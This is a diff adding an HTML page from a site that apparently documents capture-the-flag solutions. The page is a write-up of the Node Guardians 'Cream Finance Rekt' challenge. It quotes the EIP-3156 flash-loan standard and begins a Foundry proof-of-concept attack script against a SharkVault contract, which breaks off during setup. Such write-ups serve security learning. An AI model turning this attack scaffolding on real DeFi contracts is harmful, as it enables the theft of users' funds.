+                class="flex rounded px-2 py-1.5 text-sm transition-colors [word-break:break-word] cursor-pointer [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] contrast-more:border gap-2 before:opacity-25 before:content-['#'] text-gray-500 hover:bg-gray-100 hover:text-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:text-gray-900 contrast-more:dark:text-gray-50 contrast-more:border-transparent contrast-more:hover:border-gray-900 contrast-more:dark:hover:border-gray-50"
+              >Abstract</a>
+            </li>
+          <li>
+              <a
+                href="#motivation-1"
+                class="flex rounded px-2 py-1.5 text-sm transition-colors [word-break:break-word] cursor-pointer [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] contrast-more:border gap-2 before:opacity-25 before:content-['#'] text-gray-500 hover:bg-gray-100 hover:text-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:text-gray-900 contrast-more:dark:text-gray-50 contrast-more:border-transparent contrast-more:hover:border-gray-900 contrast-more:dark:hover:border-gray-50"
+              >Motivation</a>
+            </li>
+          </ul>
+  
+              
+            </li><li class="flex flex-col "><a
+    class="flex items-center justify-between gap-2 cursor-pointer rounded px-2 py-1.5 text-sm transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 contrast-more:border contrast-more:border-transparent contrast-more:text-gray-900 contrast-more:hover:border-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:dark:text-gray-50 contrast-more:dark:hover:border-gray-50"
+    href="/projects/node-guardians/poly-network-rekt-b7b8b11820c249bcb1f96a50fc20d478/"
+    
+  >Poly Network Rekt
+    </a>
+              
+            </li></ul>
+      </div>
+            </li></ul>
+      </div></li>
+          <li class=""><a
+    class="flex items-center justify-between gap-2 cursor-pointer rounded px-2 py-1.5 text-sm transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 contrast-more:border contrast-more:border-transparent contrast-more:text-gray-900 contrast-more:hover:border-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:dark:text-gray-50 contrast-more:dark:hover:border-gray-50"
+    href="/about/"
+    
+  >About
+    </a></li>
+    </ul>
+
+    <ul class="flex flex-col gap-1 max-md:hidden">
+        
+          <li class=""><a
+    class="flex items-center justify-between gap-2 cursor-pointer rounded px-2 py-1.5 text-sm transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 contrast-more:border contrast-more:border-transparent contrast-more:text-gray-900 contrast-more:hover:border-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:dark:text-gray-50 contrast-more:dark:hover:border-gray-50"
+    href="/projects/ethernaut/"
+    
+  >The Ethernaut
+        <span class="hextra-sidebar-collapsible-button"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" class="h-[18px] min-w-[18px] rounded-sm p-0.5 hover:bg-gray-800/5 dark:hover:bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="origin-center transition-transform rtl:-rotate-180"></path></svg></span>
+    </a><div class="ltr:pr-0 overflow-hidden">
+        <ul class='relative flex flex-col gap-1 before:absolute before:inset-y-1 before:w-px before:bg-gray-200 before:content-[""] ltr:ml-3 ltr:pl-3 ltr:before:left-0 rtl:mr-3 rtl:pr-3 rtl:before:right-0 dark:before:bg-neutral-800'><li class="flex flex-col "><a
+    class="flex items-center justify-between gap-2 cursor-pointer rounded px-2 py-1.5 text-sm transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 contrast-more:border contrast-more:border-transparent contrast-more:text-gray-900 contrast-more:hover:border-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:dark:text-gray-50 contrast-more:dark:hover:border-gray-50"
+    href="/projects/ethernaut/hello-ethernaut-9a7c00bee0ac470faad194c59361cd05/"
+    
+  >Hello Ethernaut
+    </a>
+              
+            </li><li class="flex flex-col "><a
+    class="flex items-center justify-between gap-2 cursor-pointer rounded px-2 py-1.5 text-sm transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 contrast-more:border contrast-more:border-transparent contrast-more:text-gray-900 contrast-more:hover:border-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:dark:text-gray-50 contrast-more:dark:hover:border-gray-50"
+    href="/projects/ethernaut/fallback-0f16d7ea49bd4084a635ec4d24c77563/"
+    
+  >Fallback
+    </a>
+              
+            </li><li class="flex flex-col "><a
+    class="flex items-center justify-between gap-2 cursor-pointer rounded px-2 py-1.5 text-sm transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 contrast-more:border contrast-more:border-transparent contrast-more:text-gray-900 contrast-more:hover:border-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:dark:text-gray-50 contrast-more:dark:hover:border-gray-50"
+    href="/projects/ethernaut/fal1out-eb9fe61a4da943248fa363e1918dd9f6/"
+    
+  >Fal1out
+    </a>
+              
+            </li><li class="flex flex-col "><a
+    class="flex items-center justify-between gap-2 cursor-pointer rounded px-2 py-1.5 text-sm transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 contrast-more:border contrast-more:border-transparent contrast-more:text-gray-900 contrast-more:hover:border-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:dark:text-gray-50 contrast-more:dark:hover:border-gray-50"
+    href="/projects/ethernaut/coin-flip-c27578d40d2f427d968d5623d7000dab/"
+    
+  >Coin Flip
+    </a>
+              
+            </li><li class="flex flex-col "><a
+    class="flex items-center justify-between gap-2 cursor-pointer rounded px-2 py-1.5 text-sm transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 contrast-more:border contrast-more:border-transparent contrast-more:text-gray-900 contrast-more:hover:border-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:dark:text-gray-50 contrast-more:dark:hover:border-gray-50"
+    href="/projects/ethernaut/telephone-8b2069f0beb045b69400a28665c1d56c/"
+    
+  >Telephone
+    </a>
+              
+            </li><li class="flex flex-col "><a
+    class="flex items-center justify-between gap-2 cursor-pointer rounded px-2 py-1.5 text-sm transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 contrast-more:border contrast-more:border-transparent contrast-more:text-gray-900 contrast-more:hover:border-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:dark:text-gray-50 contrast-more:dark:hover:border-gray-50"
+    href="/projects/ethernaut/token-4a8cb8765f8c412190f2db4a7989f9b5/"
+    
+  >Token
+    </a>
+              
+            </li><li class="flex flex-col "><a
+    class="flex items-center justify-between gap-2 cursor-pointer rounded px-2 py-1.5 text-sm transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 contrast-more:border contrast-more:border-transparent contrast-more:text-gray-900 contrast-more:hover:border-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:dark:text-gray-50 contrast-more:dark:hover:border-gray-50"
+    href="/projects/ethernaut/delegation-0c005c8b167c4966926771bad0ff918c/"
+    
+  >Delegation
+    </a>
+              
+            </li><li class="flex flex-col "><a
+    class="flex items-center justify-between gap-2 cursor-pointer rounded px-2 py-1.5 text-sm transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 contrast-more:border contrast-more:border-transparent contrast-more:text-gray-900 contrast-more:hover:border-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:dark:text-gray-50 contrast-more:dark:hover:border-gray-50"
+    href="/projects/ethernaut/force-79bc75128abc41f2b25e56b521833ab6/"
+    
+  >Force
+    </a>
+              
+            </li><li class="flex flex-col "><a
+    class="flex items-center justify-between gap-2 cursor-pointer rounded px-2 py-1.5 text-sm transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 contrast-more:border contrast-more:border-transparent contrast-more:text-gray-900 contrast-more:hover:border-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:dark:text-gray-50 contrast-more:dark:hover:border-gray-50"
+    href="/projects/ethernaut/vault-d8ba3eafb273440f9a492b042e65f214/"
+    
+  >Vault
+    </a>
+              
+            </li><li class="flex flex-col "><a
+    class="flex items-center justify-between gap-2 cursor-pointer rounded px-2 py-1.5 text-sm transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 contrast-more:border contrast-more:border-transparent contrast-more:text-gray-900 contrast-more:hover:border-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:dark:text-gray-50 contrast-more:dark:hover:border-gray-50"
+    href="/projects/ethernaut/king-8338a297a2b447b3b40166c68586199d/"
+    
+  >King
+    </a>
+              
+            </li><li class="flex flex-col "><a
+    class="flex items-center justify-between gap-2 cursor-pointer rounded px-2 py-1.5 text-sm transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 contrast-more:border contrast-more:border-transparent contrast-more:text-gray-900 contrast-more:hover:border-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:dark:text-gray-50 contrast-more:dark:hover:border-gray-50"
+    href="/projects/ethernaut/re-entrancy-6ea65e4888e349dabdc4ca12c8e6d22d/"
+    
+  >Re-entrancy
+    </a>
+              
+            </li><li class="flex flex-col "><a
+    class="flex items-center justify-between gap-2 cursor-pointer rounded px-2 py-1.5 text-sm transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 contrast-more:border contrast-more:border-transparent contrast-more:text-gray-900 contrast-more:hover:border-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:dark:text-gray-50 contrast-more:dark:hover:border-gray-50"
+    href="/projects/ethernaut/elevator-59c41c694afa45c68e603000da840a2e/"
+    
+  >Elevator
+    </a>
+              
+            </li><li class="flex flex-col "><a
+    class="flex items-center justify-between gap-2 cursor-pointer rounded px-2 py-1.5 text-sm transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 contrast-more:border contrast-more:border-transparent contrast-more:text-gray-900 contrast-more:hover:border-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:dark:text-gray-50 contrast-more:dark:hover:border-gray-50"
+    href="/projects/ethernaut/privacy-0141c59931824d74a8311099eb338d5d/"
+    
+  >Privacy
+    </a>
+              
+            </li><li class="flex flex-col "><a
+    class="flex items-center justify-between gap-2 cursor-pointer rounded px-2 py-1.5 text-sm transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 contrast-more:border contrast-more:border-transparent contrast-more:text-gray-900 contrast-more:hover:border-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:dark:text-gray-50 contrast-more:dark:hover:border-gray-50"
+    href="/projects/ethernaut/gatekeeper-one-9bbda6efa6c24367aa643eb73ae92a6a/"
+    
+  >Gatekeeper One
+    </a>
+              
+            </li><li class="flex flex-col "><a
+    class="flex items-center justify-between gap-2 cursor-pointer rounded px-2 py-1.5 text-sm transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 contrast-more:border contrast-more:border-transparent contrast-more:text-gray-900 contrast-more:hover:border-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:dark:text-gray-50 contrast-more:dark:hover:border-gray-50"
+    href="/projects/ethernaut/gatekeeper-two-d4a070f38b644143a295ecf4467fb7fa/"
+    
+  >Gatekeeper Two
+    </a>
+              
+            </li><li class="flex flex-col "><a
+    class="flex items-center justify-between gap-2 cursor-pointer rounded px-2 py-1.5 text-sm transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 contrast-more:border contrast-more:border-transparent contrast-more:text-gray-900 contrast-more:hover:border-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:dark:text-gray-50 contrast-more:dark:hover:border-gray-50"
+    href="/projects/ethernaut/naught-coin-5013cfef45d646e693a6feaac127ac33/"
+    
+  >Naught Coin
+    </a>
+              
+            </li></ul>
+      </div></li>
+          <li class="open"><a
+    class="flex items-center justify-between gap-2 cursor-pointer rounded px-2 py-1.5 text-sm transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 contrast-more:border contrast-more:border-transparent contrast-more:text-gray-900 contrast-more:hover:border-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:dark:text-gray-50 contrast-more:dark:hover:border-gray-50"
+    href="/projects/node-guardians/"
+    
+  >Node Guardians
+        <span class="hextra-sidebar-collapsible-button"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" class="h-[18px] min-w-[18px] rounded-sm p-0.5 hover:bg-gray-800/5 dark:hover:bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="origin-center transition-transform rtl:-rotate-180"></path></svg></span>
+    </a><div class="ltr:pr-0 overflow-hidden">
+        <ul class='relative flex flex-col gap-1 before:absolute before:inset-y-1 before:w-px before:bg-gray-200 before:content-[""] ltr:ml-3 ltr:pl-3 ltr:before:left-0 rtl:mr-3 rtl:pr-3 rtl:before:right-0 dark:before:bg-neutral-800'><li class="flex flex-col "><a
+    class="flex items-center justify-between gap-2 cursor-pointer rounded px-2 py-1.5 text-sm transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 contrast-more:border contrast-more:border-transparent contrast-more:text-gray-900 contrast-more:hover:border-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:dark:text-gray-50 contrast-more:dark:hover:border-gray-50"
+    href="/projects/node-guardians/price-oracle-attack-48bb5fd1fcf5428e84266833aecafe4f/"
+    
+  >Price Oracle Attack
+    </a>
+              
+            </li><li class="flex flex-col "><a
+    class="flex items-center justify-between gap-2 cursor-pointer rounded px-2 py-1.5 text-sm transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 contrast-more:border contrast-more:border-transparent contrast-more:text-gray-900 contrast-more:hover:border-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:dark:text-gray-50 contrast-more:dark:hover:border-gray-50"
+    href="/projects/node-guardians/wintermute-rekt-d0fd4609147941e6af7fcc68ef81da6a/"
+    
+  >Wintermute Rekt
+    </a>
+              
+            </li><li class="flex flex-col open"><a
+    class="flex items-center justify-between gap-2 cursor-pointer rounded px-2 py-1.5 text-sm transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      sidebar-active-item bg-primary-100 font-semibold text-primary-800 contrast-more:border contrast-more:border-primary-500 dark:bg-primary-400/10 dark:text-primary-600 contrast-more:dark:border-primary-500"
+    href="/projects/node-guardians/cream-finance-rekt-04ac5f09eb5d42c0b28fcdd8aabdc19d/"
+    
+  >Cream Finance Rekt
+    </a>
+              
+            </li><li class="flex flex-col "><a
+    class="flex items-center justify-between gap-2 cursor-pointer rounded px-2 py-1.5 text-sm transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 contrast-more:border contrast-more:border-transparent contrast-more:text-gray-900 contrast-more:hover:border-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:dark:text-gray-50 contrast-more:dark:hover:border-gray-50"
+    href="/projects/node-guardians/poly-network-rekt-b7b8b11820c249bcb1f96a50fc20d478/"
+    
+  >Poly Network Rekt
+    </a>
+              
+            </li></ul>
+      </div></li>
+        
+      </ul>
+    </div>
+  
+  
+    <div class="  sticky bottom-0 bg-white dark:bg-dark mx-4 py-4 shadow-[0_-12px_16px_#fff] flex items-center gap-2 dark:border-neutral-800 dark:shadow-[0_-12px_16px_#111] contrast-more:border-neutral-400 contrast-more:shadow-none contrast-more:dark:shadow-none border-t" data-toggle-animation="show"><div class="flex grow flex-col"><button
+  title="Change theme"
+  data-theme="light"
+  class="theme-toggle group h-7 rounded-md px-2 text-left text-xs font-medium text-gray-600 transition-colors dark:text-gray-400 hover:bg-gray-100 hover:text-gray-900 dark:hover:bg-primary-100/5 dark:hover:text-gray-50"
+  type="button"
+  aria-label="Change theme"
+>
+  <div class="flex items-center gap-2 capitalize"><svg height=12 class="group-data-[theme=light]:hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"/></svg><span class="group-data-[theme=light]:hidden">Light</span><svg height=12 class="group-data-[theme=dark]:hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"/></svg><span class="group-data-[theme=dark]:hidden">Dark</span></div>
+</button>
+</div></div></aside>
+    
+<nav class="hextra-toc order-last hidden w-64 shrink-0 xl:block print:hidden px-4" aria-label="table of contents">
+    <div class="hextra-scrollbar sticky top-16 overflow-y-auto pr-4 pt-6 text-sm [hyphens:auto] max-h-[calc(100vh-var(--navbar-height)-env(safe-area-inset-bottom))] ltr:-mr-4 rtl:-ml-4"><p class="mb-4 font-semibold tracking-tight">On this page</p><ul>
+      <li class="my-2 scroll-my-6 scroll-py-6">
+        <a class="font-semibold inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 contrast-more:text-gray-900 contrast-more:underline contrast-more:dark:text-gray-50 w-full break-words" href="#simple-summary">Simple Summary
+        </a>
+      </li>
+      <li class="my-2 scroll-my-6 scroll-py-6">
+        <a class="font-semibold inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 contrast-more:text-gray-900 contrast-more:underline contrast-more:dark:text-gray-50 w-full break-words" href="#abstract">Abstract
+        </a>
+      </li>
+      <li class="my-2 scroll-my-6 scroll-py-6">
+        <a class="font-semibold inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 contrast-more:text-gray-900 contrast-more:underline contrast-more:dark:text-gray-50 w-full break-words" href="#motivation">Motivation
+        </a>
+      </li>
+      <li class="my-2 scroll-my-6 scroll-py-6">
+        <a class="font-semibold inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 contrast-more:text-gray-900 contrast-more:underline contrast-more:dark:text-gray-50 w-full break-words" href="#simple-summary-1">Simple Summary
+        </a>
+      </li>
+      <li class="my-2 scroll-my-6 scroll-py-6">
+        <a class="font-semibold inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 contrast-more:text-gray-900 contrast-more:underline contrast-more:dark:text-gray-50 w-full break-words" href="#abstract-1">Abstract
+        </a>
+      </li>
+      <li class="my-2 scroll-my-6 scroll-py-6">
+        <a class="font-semibold inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 contrast-more:text-gray-900 contrast-more:underline contrast-more:dark:text-gray-50 w-full break-words" href="#motivation-1">Motivation
+        </a>
+      </li></ul>
+      <div class="mt-8 border-t bg-white pt-8 shadow-[0_-12px_16px_white] dark:bg-dark dark:shadow-[0_-12px_16px_#111] sticky bottom-0 flex flex-col items-start gap-2 pb-8 dark:border-neutral-800 contrast-more:border-t contrast-more:border-neutral-400 contrast-more:shadow-none contrast-more:dark:border-neutral-400">
+        <button aria-hidden="true" id="backToTop" onClick="scrollUp();" class="transition-all transition duration-75 opacity-0 text-xs font-medium text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-100 contrast-more:text-gray-800 contrast-more:dark:text-gray-50">
+          <span>Scroll to top</span>
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="inline ml-1 h-3.5 w-3.5 border rounded-full border-gray-500 hover:border-gray-900 dark:border-gray-400 dark:hover:border-gray-100 contrast-more:border-gray-800 contrast-more:dark:border-gray-50">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M4.5 15.75l7.5-7.5 7.5 7.5" />
+          </svg>
+        </button>
+      </div>
+    </div>
+  </nav>
+
+
+    <article class="w-full break-words flex min-h-[calc(100vh-var(--navbar-height))] min-w-0 justify-center pb-8 pr-[calc(env(safe-area-inset-right)-1.5rem)]">
+      <main class="w-full min-w-0 max-w-6xl px-6 pt-4 md:px-12">
+        <div class="mt-1.5 flex items-center gap-1 overflow-hidden text-sm text-gray-500 dark:text-gray-400 contrast-more:text-current">
+      <div class="whitespace-nowrap transition-colors min-w-[24px] overflow-hidden text-ellipsis hover:text-gray-900 dark:hover:text-gray-100">
+        <a href="//localhost:1313/projects/">Projects</a>
+      </div><svg class="w-3.5 shrink-0" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"/></svg>
+      <div class="whitespace-nowrap transition-colors min-w-[24px] overflow-hidden text-ellipsis hover:text-gray-900 dark:hover:text-gray-100">
+        <a href="//localhost:1313/projects/node-guardians/">Node Guardians</a>
+      </div><svg class="w-3.5 shrink-0" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"/></svg><div class="whitespace-nowrap transition-colors font-medium text-gray-700 contrast-more:font-bold contrast-more:text-current dark:text-gray-100 contrast-more:dark:text-current">Cream Finance Rekt</div>
+</div>
+
+        <div class="content">
+          <h1>Cream Finance Rekt</h1>
+          <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/katex.min.css" integrity="sha384-bYdxxUwYipFNohQlHt0bjN/LCpueqWz13HufFEV1SUatKs1cm4L6fFgCi1jT643X" crossorigin="anonymous">
+<p><a href="https://rekt.news/cream-rekt/" target="_blank" rel="noopener">https://rekt.news/cream-rekt/</a></p>
+<p><img src="/images/178ae4f1-c8c0-4d72-b2e0-4ea382dde02f.png" alt="" loading="lazy" /></p>
+<p>Flash Loan EIP : <a href="https://eips.ethereum.org/EIPS/eip-3156" target="_blank" rel="noopener">https://eips.ethereum.org/EIPS/eip-3156</a></p>
+<h2>Simple Summary<span class="absolute -mt-20" id="simple-summary"></span>
+    <a href="#simple-summary" class="subheading-anchor" aria-label="Permalink for this section"></a></h2><p>This ERC provides standard interfaces and processes for single-asset flash loans.</p>
+<h2>Abstract<span class="absolute -mt-20" id="abstract"></span>
+    <a href="#abstract" class="subheading-anchor" aria-label="Permalink for this section"></a></h2><p>A flash loan is a smart contract transaction in which a lender smart
+contract lends assets to a borrower smart contract with the condition
+that the assets are returned, plus an optional fee, before the end of
+the transaction. This ERC specifies interfaces for lenders to accept
+flash loan requests, and for borrowers to take temporary control of the
+transaction within the lender execution. The process for the safe
+execution of flash loans is also specified.</p>
+<h2>Motivation<span class="absolute -mt-20" id="motivation"></span>
+    <a href="#motivation" class="subheading-anchor" aria-label="Permalink for this section"></a></h2><p>Flash loans allow smart contracts to lend an amount of tokens without
+a requirement for collateral, with the condition that they must be
+returned within the same transaction.</p>
+<p>Early adopters of the flash loan pattern have produced different
+interfaces and different use patterns. The diversification is expected
+to intensify, and with it the technical debt required to integrate with
+diverse flash lending patterns.</p>
+<p>Some of the high level differences in the approaches across the protocols include:</p>
+<ul>
+<li>Repayment approaches at the end of the transaction, where some
+pull the principal plus the fee from the loan receiver, and others where the loan receiver needs to manually return the principal and the fee to the lender.</li>
+<li>Some lenders offer the ability to repay the loan using a token
+that is different to what was originally borrowed, which can reduce the
+overall complexity of the flash transaction and gas fees.</li>
+<li>Some lenders offer a single entry point into the protocol
+regardless of whether you’re buying, selling, depositing or chaining
+them together as a flash loan, whereas other protocols offer discrete
+entry points.</li>
+<li>Some lenders allow to flash mint any amount of their native token
+without charging a fee, effectively allowing flash loans bounded by
+computational constraints instead of asset ownership constraints.</li>
+</ul>
+<p><img src="/images/2beec3bf-2d47-445d-8dd0-30068879468f.png" alt="" loading="lazy" /></p>
+<p>First thing first, I want to have a look at the current state of the vault contract:</p>
+<div class="code-block relative mt-6 first:mt-0 group/code"><div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: UNLICENSED
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;forge-std/Script.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;forge-std/console.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">Attack</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;../src/Attack.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">SharkVault</span><span class="p">,</span> <span class="n">IERC20</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;../src/Attack.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">POC</span> <span class="k">is</span> <span class="n">Script</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">deployerPrivateKey</span> <span class="o">=</span> <span class="n">vm</span><span class="p">.</span><span class="n">envUint</span><span class="p">(</span><span class="s">&#34;PRIVATE_KEY&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">INSTANCE</span> <span class="o">=</span> <span class="n">vm</span><span class="p">.</span><span class="n">envAddress</span><span class="p">(</span><span class="s">&#34;INSTANCE&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">startBroadcast</span><span class="p">(</span><span class="n">deployerPrivateKey</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">SharkVault</span> <span class="n">vault</span> <span class="o">=</span> <span class="n">SharkVault</span><span class="p">(</span><span class="n">INSTANCE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">IERC20</span> <span class="n">gold</span> <span class="o">=</span> <span class="n">IERC20</span><span class="p">(</span><span class="n">vault</span><span class="p">.</span><span class="n">gold</span><span class="p">());</span>
